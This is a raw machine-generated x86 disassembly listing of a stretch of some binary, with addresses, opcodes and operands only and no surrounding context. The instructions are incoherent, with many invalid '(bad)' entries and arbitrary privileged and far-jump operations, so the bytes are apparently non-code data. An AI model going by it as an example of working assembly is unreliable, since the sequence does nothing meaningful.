  412cbb:	xor    al,0x42
  412cbe:	cli    
  412cbf:	stc    
  412cc0:	into   
  412cc1:	mov    edi,0xe574cbfc
  412cc6:	pop    esi
  412cc7:	xor    al,0x7c
  412cc9:	(bad)
  412ccd:	mov    edi,0xd25dcb70
  412cd2:	push   ecx
  412cd3:	mov    bl,0xc7
  412cd5:	jp     0x412cf8
  412cd7:	ins    BYTE PTR es:[edi],dx
  412cd8:	(bad)  
  412cd9:	clc    
  412cda:	fisttp DWORD PTR [ebp-0x54725f86]
  412ce0:	jg     0x412c90
  412ce2:	pop    es
  412ce3:	(bad)  
  412ce4:	mov    fs,WORD PTR cs:[ecx-0x22761658]
  412ceb:	mov    ss,WORD PTR [edx+0x79]
  412cee:	jno    0x412d55
  412cf0:	call   0x4094537a
  412cf5:	mov    es,ecx
  412cf7:	fidivr WORD PTR [ebx-0x56732023]
  412cfd:	mov    ebx,0xa7b36887
  412d02:	pop    edi
  412d03:	mov    ch,0x79
  412d05:	jecxz  0x412d59
  412d07:	mov    ds:0xcabf7580,eax
  412d0c:	je     0x412d68
  412d0e:	lahf   
  412d0f:	or     cl,BYTE PTR [eax+esi*4]
  412d12:	in     eax,0x2b
  412d14:	dec    eax
  412d15:	xadd   esi,eax
  412d18:	lea    esi,[ebp-0x76]
  412d1b:	idiv   BYTE PTR [esi+0xf]
  412d1e:	xor    al,0x3
  412d20:	xchg   ebp,eax
  412d21:	pop    ebx
  412d22:	lods   eax,DWORD PTR ds:[esi]
  412d23:	dec    edx
  412d24:	xor    DWORD PTR [edx],eax
  412d26:	mov    DWORD PTR ds:0xfc465b16,edi
  412d2c:	and    DWORD PTR [esi-0x53],0x484130db
  412d33:	inc    eax
  412d34:	cmp    al,BYTE PTR [ebp+0x52ce33be]
  412d3a:	adc    al,BYTE PTR [edx+0x1a]
  412d3d:	jb     0x412d30
  412d3f:	aas    
  412d40:	idiv   BYTE PTR [edx-0x6e]
  412d43:	pop    ss
  412d44:	adc    cl,ah
  412d46:	call   0x8989:0x932261d8
  412d4d:	push   ebp
  412d4e:	add    BYTE PTR [ebx+0x5b],al
  412d51:	cdq    
  412d52:	nop
  412d53:	cs mov dl,0x39
  412d57:	push   esi
  412d58:	xor    bl,BYTE PTR [ecx+0x2bcb41a]
  412d5e:	es repnz jmp 0x3406:0xa5670a73
  412d67:	sti    
  412d68:	outs   dx,BYTE PTR ds:[esi]
  412d69:	sti    
  412d6a:	mov    DWORD PTR [eax],edx
  412d6c:	icebp  
  412d6d:	cmc    
  412d6e:	push   ecx
  412d6f:	xchg   esi,eax
  412d70:	std    
  412d71:	icebp  
  412d72:	and    DWORD PTR [edi],ebp
  412d74:	mov    bh,0xd0
  412d76:	xor    BYTE PTR [edx-0x1fbd6559],ch
  412d7c:	dec    ebp
  412d7d:	ins    BYTE PTR es:[edi],dx
  412d7e:	repnz inc ebp
  412d80:	push   esp
  412d81:	stc    
  412d82:	ret    0xb334
  412d85:	inc    eax
  412d86:	dec    edi
  412d87:	mov    ?,esi
  412d89:	idiv   BYTE PTR [edx]
  412d8b:	dec    eax
  412d8c:	xchg   ebp,eax
  412d8d:	arpl   si,cx
  412d8f:	inc    esp
  412d90:	iret   
  412d91:	sub    BYTE PTR [edx+0x615041f],dh
  412d97:	add    al,BYTE PTR [ebx-0x6a2afde3]
  412d9d:	repz mov dl,0xf7
  412da0:	mov    DWORD PTR [eax+0x0],ebp
  412da3:	push   ebx
  412da4:	repnz retf 
  412da6:	push   DWORD PTR [edi+0x470eb1e8]
  412dac:	ret    
  412dad:	mov    dh,0x80
  412daf:	fwait
  412db0:	aas    
  412db1:	push   ebx
  412db2:	xchg   ebx,eax
  412db3:	xor    ch,BYTE PTR [ebx-0x76]
  412db6:	inc    esi
  412db7:	or     al,0x7d
  412db9:	lods   al,BYTE PTR ds:[esi]
  412dba:	push   cs
  412dbb:	mov    esp,0x72c71265
  412dc0:	jl     0x412de8
  412dc2:	into   
  412dc3:	data16 jmp 0x412da2
  412dc6:	hlt    
  412dc7:	pop    ecx
  412dc8:	jae    0x412e25
  412dca:	sbb    edi,DWORD PTR [ebx]
  412dcc:	aas    
  412dcd:	popa   
  412dce:	mov    bl,0x3e
  412dd0:	stos   BYTE PTR es:[edi],al
  412dd1:	retf   
  412dd2:	cmp    ch,BYTE PTR [eax-0x15]
  412dd5:	adc    eax,0xe5a21cbe
  412dda:	scas   eax,DWORD PTR es:[edi]
  412ddb:	or     ch,ah
  412ddd:	push   es
  412dde:	push   esi
  412ddf:	sahf   
  412de0:	addr16 clc 
  412de2:	xchg   esi,eax
  412de3:	jbe    0x412da6
  412de5:	mov    esi,DWORD PTR [esi]
  412de7:	and    DWORD PTR [edx],0x3b7a25b4
  412ded:	or     eax,0x6fde17e5
  412df2:	push   esi
  412df3:	les    ebp,FWORD PTR [ebx+0x7d]
  412df6:	scas   al,BYTE PTR es:[edi]
  412df7:	arpl   WORD PTR ds:0x4468c3d1,cx
  412dfd:	push   es
  412dfe:	mov    WORD PTR [eax],es
  412e00:	xchg   esp,eax
  412e01:	push   esi
  412e02:	js     0x412dbd
  412e04:	sbb    DWORD PTR [edx-0x480805d9],esi
  412e0a:	fsub   DWORD PTR [ecx]
  412e0c:	pop    ecx
  412e0d:	pop    esi
  412e0e:	sbb    DWORD PTR [eax-0x4],eax
  412e11:	xor    BYTE PTR [ebp-0x42f6e1e5],dh
  412e17:	stos   DWORD PTR es:[edi],eax
  412e18:	cmp    DWORD PTR [ecx-0x63],esi
  412e1b:	ins    BYTE PTR es:[edi],dx
  412e1c:	mov    ah,0x66
  412e1e:	xor    al,0x1e
  412e20:	scas   eax,DWORD PTR es:[edi]
  412e21:	cmp    DWORD PTR [ecx-0x4a7211a2],0x8374f427
  412e2b:	ss xchg esp,eax
  412e2d:	mov    edx,0x52f7ad0
  412e32:	add    eax,0x41789b3b
  412e37:	push   0x3581a39c
  412e3c:	arpl   WORD PTR [ecx-0x5f],si
  412e3f:	jg     0x412ea0
  412e41:	sub    DWORD PTR ds:0x46429974,edi
  412e47:	mov    ah,0x5d
  412e49:	cmp    DWORD PTR [eax-0x353db15f],ebp
  412e4f:	out    0x72,al
  412e51:	retf   0x965f
  412e54:	cli    
  412e55:	gs ins DWORD PTR es:[edi],dx
  412e57:	std    
  412e58:	in     eax,dx
  412e59:	jl     0x412e37
  412e5b:	or     bh,BYTE PTR [edx-0x263398c2]
  412e61:	inc    edi
  412e62:	push   ebx
  412e63:	icebp  
  412e64:	sub    eax,0x2ac002d7
  412e69:	inc    edx
  412e6a:	mov    bl,0x1d
  412e6c:	adc    ch,ah
  412e6e:	fwait
  412e6f:	mov    ebx,0x3ab18ad2
  412e74:	(bad)  
  412e75:	push   ecx
  412e76:	scas   al,BYTE PTR es:[edi]
  412e77:	stos   BYTE PTR es:[edi],al
  412e78:	mul    BYTE PTR [ecx-0x3ae28459]
  412e7e:	or     BYTE PTR ds:0xf6b0c9db,0x2
  412e85:	xor    dl,BYTE PTR [eax+0x54]
  412e88:	pop    es
  412e89:	jp     0x412eb5
  412e8b:	push   es
  412e8c:	loope  0x412ec6
  412e8e:	(bad)  
  412e8f:	adc    edi,ecx
  412e91:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412e92:	dec    esp
  412e93:	das    
  412e94:	mov    ds:0xf9f81b60,eax
  412e99:	test   eax,0x1db9171c
  412e9e:	aas    
  412e9f:	repnz aam 0xf9
  412ea2:	out    0x1,eax
  412ea4:	jmp    DWORD PTR [ebx-0x1c]
  412ea7:	fcomp  QWORD PTR [ebx-0x6290fe45]
  412ead:	sbb    al,0x9c
  412eaf:	cmp    al,bl
  412eb1:	cld    
  412eb2:	ins    DWORD PTR es:[edi],dx
  412eb3:	pop    edx
  412eb4:	cwde   
  412eb5:	adc    ecx,ebx
  412eb7:	jb     0x412eb4
  412eb9:	add    ebx,DWORD PTR [ecx-0x385418f0]
  412ebf:	loopne 0x412ecd
  412ec1:	jl     0x412e50
  412ec3:	fwait
  412ec4:	push   ds
  412ec5:	add    ebx,0xba89e12d
  412ecb:	cmp    DWORD PTR [ecx*1-0x55e850f9],0x6712f218
  412ed6:	push   ecx
  412ed7:	mov    ebx,0x48dda413
  412edc:	inc    edx
  412edd:	jo     0x412f01
  412edf:	inc    esi
  412ee0:	test   eax,0xd2f39fb6
  412ee5:	imul   DWORD PTR [edi-0x1e]
  412ee8:	push   esp
  412ee9:	sub    edx,edx
  412eeb:	cmp    DWORD PTR [edi+0x6432eca6],ecx
  412ef1:	shr    BYTE PTR ds:0xb998c47f,cl
  412ef7:	lds    edx,FWORD PTR [ebp-0x3beb83d1]
  412efd:	sbb    edi,esp
  412eff:	sbb    DWORD PTR [edi],esp
  412f01:	popa   
  412f02:	nop
  412f03:	cmp    BYTE PTR [eax-0x797f4c98],bh
  412f09:	xchg   BYTE PTR [ecx+0x75981582],cl
  412f0f:	push   esp
  412f10:	enter  0x430d,0xbd
  412f14:	xor    eax,0x33ac56ef
  412f19:	pushf  
  412f1a:	gs jl  0x412eb6
  412f1d:	retf   0x349b
  412f20:	mov    ebx,ebp
  412f22:	popf   
  412f23:	pop    ss
  412f24:	lea    eax,[ebx+0x4e]
  412f27:	sub    al,0x1f
  412f29:	mov    ecx,0xaeb7d5ba
  412f2e:	(bad)  
  412f2f:	sub    eax,0xe3e958b5
  412f34:	int3   
  412f35:	test   DWORD PTR [esi+ebp*4+0x44],edx
  412f39:	test   eax,0xbbb6340f
  412f3e:	das    
  412f3f:	fist   DWORD PTR [ecx+0x37]
  412f42:	js     0x412fb6
  412f44:	mov    eax,ds:0x6bf05aa5
  412f49:	xchg   ebp,eax
  412f4a:	sar    BYTE PTR [ebx-0x27],0xfa
  412f4e:	bound  esp,QWORD PTR [edx]
  412f50:	push   ebx
  412f51:	ret    
  412f52:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412f53:	sbb    DWORD PTR ds:0x121fc58a,0xffffffb2
  412f5a:	popf   
  412f5b:	ins    BYTE PTR es:[edi],dx
  412f5c:	inc    edx
  412f5d:	scas   eax,DWORD PTR es:[edi]
  412f5e:	test   al,0xea
  412f60:	jne    0x412f55
  412f62:	test   BYTE PTR [ecx],dh
  412f64:	shl    BYTE PTR [esp+ecx*8+0x3c82f8fa],0xe5
  412f6c:	jae    0x412fc2
  412f6e:	(bad)  
  412f70:	mov    ebx,0x7789172
  412f75:	cmp    BYTE PTR [ebx],ch
  412f77:	or     eax,0x7f2fd918
  412f7c:	ror    DWORD PTR [edi],1
  412f7e:	push   cs
  412f7f:	mov    DWORD PTR [esi-0x5],esp
  412f82:	dec    ebx
  412f83:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412f84:	mov    cl,0xa2
  412f86:	pop    ss
  412f87:	sub    esp,edx
  412f89:	or     eax,0xcddcb2da
  412f8e:	cdq    
  412f8f:	inc    edi
  412f90:	lea    ebp,[edx-0x3c]
  412f93:	cmp    al,0x46
  412f95:	clc    
  412f96:	into   
  412f97:	mov    eax,ds:0x9a856246
  412f9c:	cmc    
  412f9d:	cmp    al,0x7c
  412f9f:	xor    BYTE PTR [eax],dl
  412fa1:	inc    ebp
  412fa2:	cmp    ebp,DWORD PTR [ecx-0x1b]
  412fa5:	retf   0x4419
  412fa8:	jge    0x413001
  412faa:	push   ebx
  412fab:	push   cs
  412fac:	mov    cl,dh
  412fae:	inc    esp
  412faf:	cmp    eax,0x65559d83
  412fb4:	js     0x41302f
  412fb6:	mov    ecx,0xdec5fd1
  412fbb:	pop    ebx
  412fbc:	shl    DWORD PTR ds:0x16c3dcf6,0x3f
  412fc3:	cdq    
  412fc4:	inc    esp
  412fc5:	pop    es
  412fc6:	and    BYTE PTR [eax+0x4a4c6a10],bh
  412fcc:	in     al,0xe3
  412fce:	in     al,0x97
  412fd0:	pushf  
  412fd1:	in     al,dx
  412fd2:	mov    bh,0x8a
  412fd4:	or     eax,0x78785f26
  412fd9:	or     edi,DWORD PTR [ebx+0x6]
  412fdc:	outs   dx,BYTE PTR ds:[esi]
  412fdd:	mov    ebp,0xab579db2
  412fe2:	push   edx
  412fe3:	dec    edx
  412fe4:	mov    ebx,0x9d0f64d7
  412fe9:	jns    0x413028
  412feb:	push   cs
  412fec:	jle    0x41304d
  412fee:	push   0x3ba0bafd
  412ff3:	mov    esp,0x9538ede3
  412ff8:	enter  0xce8c,0x6
  412ffc:	mov    ebx,0xab5358b0
  413001:	es jmp 0x7cd0f899
  413007:	mov    ebx,0x25c316aa
  41300c:	jae    0x412fdb
  41300e:	scas   eax,DWORD PTR es:[edi]
  41300f:	imul   ecx,DWORD PTR [ebp+0x7a467d26],0xf9ae17f9
  413019:	push   edx
  41301a:	in     al,0x49
  41301c:	ja     0x412ff5
  41301e:	outs   dx,BYTE PTR ds:[esi]
  41301f:	xor    DWORD PTR [esi-0x6591d1b2],edx
  413025:	xor    DWORD PTR [edi-0x4d],esp
  413028:	add    ch,ah
  41302a:	je     0x413035
  41302c:	out    dx,al
  41302d:	je     0x4130a6
  41302f:	or     dl,BYTE PTR [ecx-0x33a2177e]
  413035:	(bad)  
  413036:	push   ss
  413037:	retf   
  413038:	fnstcw WORD PTR [esi]
  41303a:	sbb    al,0xac
  41303c:	xchg   ebx,eax
  41303d:	sahf   
  41303e:	inc    edi
  41303f:	(bad)  
  413040:	mov    eax,0x6910104
  413045:	adc    BYTE PTR [ebx+0x8],ah
  413048:	or     BYTE PTR [edx+0x14],dl
  41304b:	es sbb ah,0xee
  41304f:	sub    bl,ch
  413051:	xchg   esp,eax
  413052:	xor    edi,eax
  413054:	stc    
  413055:	test   eax,0xa947833b
  41305a:	and    BYTE PTR [ecx-0x6a],al
  41305d:	test   edi,edx
  41305f:	mov    bh,0x25
  413061:	repz jo 0x413040
  413064:	int3   
  413065:	cmp    dh,BYTE PTR [ecx]
  413067:	retf   0xbfa5
  41306a:	pop    esp
  41306b:	or     BYTE PTR [edx-0x77],dl
  41306e:	inc    BYTE PTR [ebx]
  413070:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413071:	cmp    eax,0x31c54125
  413076:	mov    eax,0xcc0e6c1b
  41307b:	or     cl,BYTE PTR [ecx-0x360fa474]
  413081:	cmp    eax,0xa435ec7
  413086:	call   0x2e156009
  41308b:	cwde   
  41308c:	adc    BYTE PTR [edx+edi*4],al
  41308f:	in     eax,0xa8
  413091:	fsubr  QWORD PTR [ecx-0x24]
  413094:	data16 cli 
  413096:	cmc    
  413097:	dec    ebx
  413098:	adc    BYTE PTR [edx],ch
  41309a:	dec    BYTE PTR [esi+esi*1-0x29]
  41309e:	mov    ds:0x9c6c2acb,al
  4130a3:	cmp    ch,al
  4130a5:	clc    
  4130a6:	cmp    eax,0x2bdb080e
  4130ab:	adc    al,0x7e
  4130ad:	ja     0x4130ec
  4130af:	(bad)  
  4130b0:	fisub  DWORD PTR [ecx-0x7dc35532]
  4130b6:	data16 jg 0x4130d0
  4130b9:	nop
  4130ba:	xor    eax,0xf416b8bc
  4130bf:	cmp    DWORD PTR [ebx-0x3c43a2f6],edi
  4130c5:	adc    al,ah
  4130c7:	fidiv  DWORD PTR [eax+eax*2-0x2c]
  4130cb:	xlat   BYTE PTR ds:[ebx]
  4130cc:	add    eax,0x8b9b1a58
  4130d1:	jae    0x4130f0
  4130d3:	inc    edx
  4130d4:	pop    ecx
  4130d5:	xlat   BYTE PTR ss:[ebx]
  4130d7:	jno    0x4130f4
  4130d9:	or     al,0x98
  4130db:	pop    ss
  4130dc:	jb     0x413078
  4130de:	dec    ecx
  4130df:	xor    eax,0xc4242935
  4130e4:	out    dx,al
  4130e5:	stos   DWORD PTR es:[edi],eax
  4130e6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4130e8:	fild   DWORD PTR [edx+0x28]
  4130eb:	ret    
  4130ec:	call   0x5c17cca
  4130f1:	adc    ch,BYTE PTR [edx+0x41d30ffc]
  4130f7:	idiv   BYTE PTR [esp+edi*1+0x796f76dd]
  4130fe:	stos   DWORD PTR es:[edi],eax
  4130ff:	es dec esp
  413101:	shl    DWORD PTR [ecx+0x26781fec],1
  413107:	icebp  
  413108:	daa    
  413109:	xchg   esp,eax
  41310a:	mov    ebx,0x2ea85a6
  41310f:	fld    TBYTE PTR [ebx]
  413111:	dec    edi
  413112:	pop    eax
  413113:	ret    
  413114:	out    dx,eax
  413115:	mov    al,ds:0x587a0b98
  41311a:	add    al,0x93
  41311c:	rcr    dl,0x78
  41311f:	xchg   edx,eax
  413120:	dec    ecx
  413121:	xrelease xchg DWORD PTR ds:0xc50319a5,esp
  413128:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413129:	inc    edx
  41312a:	sub    eax,esi
  41312c:	and    BYTE PTR [edi+0x15],ch
  41312f:	lods   al,BYTE PTR ds:[esi]
  413130:	mov    dh,0xd
  413132:	clc    
  413133:	jbe    0x41318f
  413135:	lea    ecx,[edi+0x3d]
  413138:	xchg   esi,eax
  413139:	rcr    DWORD PTR [ebx+0x66798fff],cl
  41313f:	fadd   QWORD PTR [edi-0xab24626]
  413145:	mov    edi,0x9f1ae7af
  41314a:	push   esi
  41314b:	cmp    DWORD PTR [ebx-0x2e],ebx
  41314e:	stos   BYTE PTR es:[edi],al
  41314f:	xor    edx,esi
  413151:	jnp    0x413198
  413153:	jp     0x4131c2
  413155:	xor    ebp,0xf5f9b925
  41315b:	mov    al,ds:0x7bf828b0
  413160:	mov    ds:0x2a2433b2,eax
  413165:	push   ebx
  413166:	sbb    BYTE PTR [edx+0x22404fec],0x75
  41316d:	stc    
  41316e:	pop    ecx
  41316f:	dec    edx
  413170:	cdq    
  413171:	add    eax,0xf875295e
  413176:	fbld   TBYTE PTR [ebx+0x2c]
  413179:	sbb    ebp,esp
  41317b:	jnp    0x41319e
  41317d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41317e:	mov    ebx,0x527cf2b3
  413183:	retf   
  413184:	pop    ecx
  413185:	test   eax,0x14edd55c
  41318a:	pop    es
  41318b:	push   ebx
  41318c:	sbb    cl,ah
  41318e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41318f:	xor    eax,0xdf5d46c4
  413194:	call   0x9179644a
  413199:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41319a:	push   esi
  41319b:	xor    eax,0x4ccffc01
  4131a0:	jecxz  0x4131eb
  4131a2:	jb     0x4131f7
  4131a4:	inc    ebp
  4131a5:	arpl   sp,dx
  4131a7:	sub    DWORD PTR [edi],edi
  4131a9:	fdivrp st(1),st
  4131ab:	mov    edi,0x1d6d9ebd
  4131b0:	push   ds
  4131b1:	jno    0x41317f
  4131b3:	loope  0x41314e
  4131b5:	push   edx
  4131b6:	push   eax
  4131b7:	adc    bh,ah
  4131b9:	xor    dl,BYTE PTR [ecx-0x2c7d446e]
  4131bf:	out    0xea,al
  4131c1:	pop    es
  4131c2:	test   al,0x29
  4131c4:	push   0xde5c2622
  4131c9:	pop    ds
  4131ca:	cmp    BYTE PTR ds:0xaf277fa,cl
  4131d0:	repz mov ebx,0x7beb5b55
  4131d6:	push   ss
  4131d7:	push   esi
  4131d8:	fwait
  4131d9:	in     al,dx
  4131da:	std    
  4131db:	mov    esi,DWORD PTR [edi-0x30771c0d]
  4131e1:	xor    ebx,DWORD PTR [edi+edi*1+0x51]
  4131e5:	scas   al,BYTE PTR es:[edi]
  4131e6:	aaa    
  4131e7:	xchg   BYTE PTR [eax+0x35],bh
  4131ea:	push   ebx
  4131eb:	in     al,dx
  4131ec:	(bad)  
  4131ed:	out    0x5,eax
  4131ef:	nop
  4131f0:	mov    esp,0x9beab151
  4131f5:	test   al,0xb9
  4131f7:	sti    
  4131f8:	push   esp
  4131f9:	(bad)  
  4131fa:	fwait
  4131fb:	inc    esi
  4131fc:	push   esp
  4131fd:	into   
  4131fe:	pop    eax
  4131ff:	inc    ebx
  413200:	loope  0x41323a
  413202:	sbb    BYTE PTR ds:0x13074a0d,cl
  413208:	mov    ch,0xa7
  41320a:	enter  0xda0f,0x29
  41320e:	inc    esi
  41320f:	shl    edx,0x31
  413212:	adc    al,0x4b
  413214:	rcl    DWORD PTR [ecx-0x3d48cf62],0xf2
  41321b:	sbb    eax,0xaa056306
  413220:	out    dx,al
  413221:	pop    ebp
  413222:	lds    edx,FWORD PTR [ebx-0x771c0633]
  413228:	(bad)  
  413229:	daa    
  41322a:	imul   esi,esp,0xae54f7f9
  413230:	adc    BYTE PTR [ebx-0x75e054f5],ch
  413236:	push   ss
  413237:	(bad)  
  413238:	pause  
  41323a:	or     DWORD PTR [edi+ecx*4+0x6f],ebx
  41323e:	and    al,0x8
  413240:	ret    0x2b15
  413243:	or     dh,bh
  413245:	cs inc ebx
  413247:	pop    edi
  413248:	sub    BYTE PTR [ebx],bh
  41324a:	sbb    al,0x96
  41324c:	pop    ss
  41324d:	jno    0x413211
  41324f:	pop    ds
  413250:	jmp    0x413204
  413252:	add    ah,bh
  413254:	or     BYTE PTR [ecx+eiz*2+0x7796f25d],0xbd
  41325c:	push   esi
  41325d:	jmp    0x5575f3d2
  413262:	dec    esp
  413263:	stos   BYTE PTR es:[edi],al
  413264:	rcr    BYTE PTR [ebp-0x7645da4e],0xb0
  41326b:	sub    DWORD PTR [edx+0x11],edi
  41326e:	xor    esi,DWORD PTR [esp+eax*1-0x6e]
  413272:	jmp    0xa727:0x44df52c0
  413279:	imul   esi,DWORD PTR [eax+0x6c0656f3],0x62966bae
  413283:	lods   al,BYTE PTR ds:[esi]
  413284:	(bad)  
  413285:	fwait
  413286:	ins    BYTE PTR es:[edi],dx
  413287:	and    al,0x51
  413289:	jno    0x4132fb
  41328b:	add    al,0xd1
  41328d:	nop
  41328e:	mov    BYTE PTR [di+0x4e3c],bh
  413293:	arpl   WORD PTR [ecx+0x6d],bx
  413296:	rol    DWORD PTR [ecx],cl
  413298:	jecxz  0x4132d2
  41329a:	hlt    
  41329b:	or     BYTE PTR [ebx-0x2239391],cl
  4132a1:	push   ss
  4132a2:	ret    
  4132a3:	add    BYTE PTR [eax+0x1b],ah
  4132a6:	push   ecx
  4132a7:	test   eax,0x407274d0
  4132ac:	mov    cl,0x95
  4132ae:	lods   eax,DWORD PTR ds:[esi]
  4132af:	jae    0x413249
  4132b1:	imul   edx,esi,0xdf30f7af
  4132b7:	dec    BYTE PTR [esi]
  4132b9:	lock fldenv [esi+ecx*4]
  4132bd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4132be:	nop
  4132bf:	ror    BYTE PTR [eax],0x76
  4132c2:	jns    0x4132b7
  4132c4:	js     0x41327c
  4132c6:	xchg   esi,eax
  4132c7:	mov    WORD PTR [edi+0x79652f81],fs
  4132cd:	pop    edx
  4132ce:	cld    
  4132cf:	repz add DWORD PTR [esi+0x8],esi
  4132d3:	jl     0x413311
  4132d5:	xor    BYTE PTR [eax],dh
  4132d7:	mov    BYTE PTR ds:0x4b565861,bh
  4132dd:	daa    
  4132de:	dec    esp
  4132df:	in     eax,dx
  4132e0:	popa   
  4132e1:	inc    ecx
  4132e2:	or     eax,0xc3687162
  4132e7:	and    eax,0x64945ecc
  4132ec:	inc    esp
  4132ed:	or     cl,BYTE PTR [ecx+ebp*4-0x63cf2a05]
  4132f4:	push   cs
  4132f5:	cmp    ebx,esi
  4132f7:	mov    ch,0x6f
  4132f9:	push   ss
  4132fa:	pusha  
  4132fb:	aaa    
  4132fc:	add    DWORD PTR [ebx+ebp*2+0x24ebc80],eax
  413303:	sbb    al,0xd
  413305:	adc    al,0xdc
  413307:	fs leave 
  413309:	push   cs
  41330a:	sbb    ah,BYTE PTR [edx]
  41330c:	test   ebp,edi
  41330e:	cmp    dl,BYTE PTR [esi+0x77]
  413311:	add    BYTE PTR [ebp+0x53],0x66
  413315:	lods   eax,DWORD PTR ds:[esi]
  413316:	stos   DWORD PTR es:[edi],eax
  413317:	lds    ebx,FWORD PTR [eax-0x5bc15a34]
  41331d:	push   ecx
  41331e:	xchg   edx,eax
  41331f:	and    al,0x8d
  413321:	xchg   esp,eax
  413322:	add    cl,BYTE PTR [esi-0x27]
  413325:	xor    BYTE PTR [edi],bh
  413327:	jmp    0x39ac0a79
  41332c:	sub    ebx,esi
  41332e:	and    eax,0xce9a2989
  413333:	xlat   BYTE PTR ds:[ebx]
  413334:	aas    
  413335:	cwde   
  413336:	mov    ah,0x97
  413338:	sub    eax,0xe9c5b02a
  41333d:	mov    esp,0x983d494b
  413342:	outs   dx,DWORD PTR ds:[esi]
  413343:	push   esi
  413344:	pop    ecx
  413345:	cmp    eax,0x92f0916d
  41334a:	enter  0x49a3,0x3b
  41334e:	sbb    DWORD PTR [ebp-0x4c],0xebe7d916
  413355:	into   
  413356:	ror    DWORD PTR [edi-0x265d88e4],0xc0
  41335d:	mov    bl,0x61
  41335f:	in     eax,0x60
  413361:	pop    edi
  413362:	pop    esp
  413363:	push   ss
  413364:	lods   eax,DWORD PTR ds:[esi]
  413365:	pop    DWORD PTR [edx]
  413367:	mov    esi,0x6381c3aa
  41336c:	jo     0x41338a
  41336e:	repnz dec esi
  413370:	aad    0x46
  413372:	inc    edi
  413374:	xchg   edi,eax
  413375:	dec    esi
  413376:	lods   al,BYTE PTR ds:[esi]
  413377:	cmp    bl,BYTE PTR [ebx]
  413379:	mov    edx,0xedf8d72e
  41337e:	inc    esi
  41337f:	leave  
  413380:	cld    
  413381:	xlat   BYTE PTR ds:[ebx]
  413382:	dec    ebp
  413383:	cdq    
  413384:	mov    edx,0x78c94854
  413389:	or     BYTE PTR [ecx+0x72bf4c0],dh
  41338f:	push   0xa605768b
  413394:	(bad)  [eax-0x34]
  413397:	jecxz  0x4133fd
  413399:	es dec edx
  41339b:	push   ecx
  41339c:	and    al,0x43
  41339e:	mov    edx,0x652f90b
  4133a3:	into   
  4133a4:	mov    al,ds:0x674dd699
  4133a9:	push   DWORD PTR [ebx]
  4133ab:	sbb    BYTE PTR [edi+0x520fd896],0x13
  4133b2:	sub    ebp,DWORD PTR ds:0xe1279803
  4133b8:	int3   
  4133b9:	cmp    eax,0xb8971d3a
  4133be:	and    al,BYTE PTR [eax+edi*4]
  4133c1:	stos   DWORD PTR es:[edi],eax
  4133c2:	loope  0x4133de
  4133c4:	xor    esp,DWORD PTR [ebp+ebp*2+0x3b]
  4133c8:	loop   0x413355
  4133ca:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4133cb:	mov    eax,ds:0xeeba63d1
  4133d0:	jb     0x41344e
  4133d2:	or     ebx,esi
  4133d4:	xchg   ebp,eax
  4133d5:	jp     0x41344c
  4133d7:	or     al,0x91
  4133d9:	mov    ds:0xf1934e00,al
  4133de:	sub    dl,BYTE PTR [ebx+ecx*4+0x6]
  4133e2:	sar    DWORD PTR [esi+0xa],1
  4133e5:	std    
  4133e6:	xor    DWORD PTR [ebx],0x4a5067ff
  4133ec:	sbb    edi,ecx
  4133ee:	stos   BYTE PTR es:[edi],al
  4133ef:	or     al,0x6c
  4133f1:	fist   WORD PTR [ecx+0x6a]
  4133f4:	mov    cl,0x20
  4133f6:	aam    0x65
  4133f8:	cwde   
  4133f9:	inc    eax
  4133fa:	mov    edx,?
  4133fc:	clc    
  4133fd:	test   edx,ebp
  4133ff:	fidiv  WORD PTR [ebx-0x44eda2c1]
  413405:	push   cs
  413406:	cmp    al,0xb3
  413408:	jg     0x41346d
  41340a:	adc    esp,edx
  41340c:	mov    dl,0xa8
  41340e:	loopne 0x41346e
  413410:	call   0x1f9903bb
  413415:	jp     0x413479
  413417:	add    bl,ah
  413419:	pushf  
  41341a:	inc    eax
  41341b:	cmc    
  41341c:	ja     0x41342e
  41341e:	cli    
  41341f:	add    al,0x8e
  413421:	aad    0x5b
  413423:	imul   DWORD PTR [edx]
  413425:	push   0x30f0a51a
  41342a:	repz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41342c:	outs   dx,BYTE PTR ds:[esi]
  41342e:	sahf   
  41342f:	adc    DWORD PTR [esi],esi
  413431:	pop    eax
  413432:	(bad)  
  413433:	leave  
  413434:	out    dx,al
  413435:	(bad)  
  413436:	fist   DWORD PTR [edi+0x4fd9b60]
  41343c:	and    eax,DWORD PTR [ecx+ebp*4]
  41343f:	shl    DWORD PTR fs:[edi+eax*2+0x72],0xfb
  413445:	in     eax,dx
  413446:	cmp    BYTE PTR [eax+0x20],al
  413449:	mov    bl,0xeb
  41344b:	inc    esi
  41344c:	or     DWORD PTR [edi+esi*8+0x2e4bd0ee],ebx
  413453:	call   0x5cd847c0
  413458:	(bad)  
  413459:	dec    edx
  41345a:	stos   DWORD PTR es:[edi],eax
  41345b:	pushw  0xfacf
  41345f:	mov    eax,ds:0xdea3e90c
  413464:	retf   
  413465:	push   ss
  413466:	add    al,0x59
  413468:	(bad)  
  41346c:	mov    ecx,0x37e05d39
  413471:	rcr    BYTE PTR [edi],cl
  413473:	icebp  
  413474:	int    0xfd
  413476:	adc    eax,0xe08fa693
  41347b:	mov    DWORD PTR [ecx+eax*1],0x8dabf799
  413482:	cmc    
  413483:	cmp    dh,BYTE PTR [ebp+0x78]
  413486:	loop   0x41340a
  413488:	adc    BYTE PTR [edx+esi*8+0xe],dh
  41348c:	inc    ecx
  41348d:	jl     0x4134d9
  41348f:	(bad)  
  413490:	data16 test BYTE PTR [eax+0x48],al
  413494:	loop   0x4134ea
  413496:	and    al,0xaf
  413498:	retf   
  413499:	aas    
  41349a:	rcr    DWORD PTR [eax+0x3d3e62be],0x4e
  4134a1:	stc    
  4134a2:	adc    edx,esi
  4134a4:	push   eax
  4134a5:	sbb    esi,esi
  4134a7:	xor    ch,dh
  4134a9:	xor    ecx,ebp
